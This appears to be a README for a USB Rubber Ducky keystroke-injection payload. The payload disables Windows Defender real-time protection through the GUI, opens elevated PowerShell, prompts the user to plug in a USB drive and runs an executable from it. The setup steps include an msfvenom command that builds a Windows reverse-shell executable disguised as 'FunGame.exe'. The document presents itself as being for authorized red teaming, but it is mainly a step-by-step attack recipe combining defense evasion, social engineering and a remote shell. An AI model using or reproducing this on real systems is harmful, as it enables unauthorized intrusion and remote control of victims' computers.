# HID Payload: Windows Defender Disable + USB Executable Launch (Authorized Use Only)

> ⚠️ For ethical red teaming, physical security testing, and educational use **only**.

This repository demonstrates how to use a HID injection device (such as a **USB Rubber Ducky**) to:

* Simulate GUI automation of **disabling Windows Defender real-time protection**
* Prompt the user to plug in a USB drive
* Execute an `.exe` payload (e.g. `FunGame.exe`) from the USB device

⚠️ **Do not run this code on any system you do not have explicit permission to test.**

---

## 💼 Intended Use Cases

* Red team physical security testing (with written authorization)
* Social engineering simulation exercises
* Demonstrating physical attack surface to stakeholders
* Purple team testing of endpoint defenses

---

## 📋 What It Does (Step-by-Step)

1. Opens the Windows Defender Security Center via `windowsdefender:` URI
2. Navigates the UI using `TAB`, `ENTER`, and `SPACE` keystrokes to disable **real-time protection**
3. Launches an elevated PowerShell session using `Start-Process -Verb runAs`
4. Displays a message box instructing the user to plug in the USB within 15 seconds
5. Launches another elevated PowerShell session
6. Executes `FunGame.exe` directly from the USB (drive `D:\` assumed, adjust as needed)

---

## 🖱 Payload Trigger

Use a HID device like [Hak5 Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) or [MalDuino](https://malduino.com/) to inject the keystrokes in `payload.txt`.

---

## 📁 Files
* `payload.txt` – Final Ducky Script HID payload 
* `README.md` – Documentation

---

## 🚀 Setup Instructions

1. Flash the HID device with the provided payload using the official encoder.
2. Prepare a USB drive labeled `MYUSB` with a file named `FunGame.exe` with a msfvenom payload using --msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 -f exe > FunGame.exe--
3. Insert the HID device into the target machine.
4. After Defender is disabled and the message appears, plug in the USB.
5. `FunGame.exe` will be executed from the USB.

---

## ⚙️ Customization

To change the USB drive letter:

* Modify this line in `payload.txt`:

  ```ducky
  STRING Start-Process "D:\FunGame.exe"
  ```
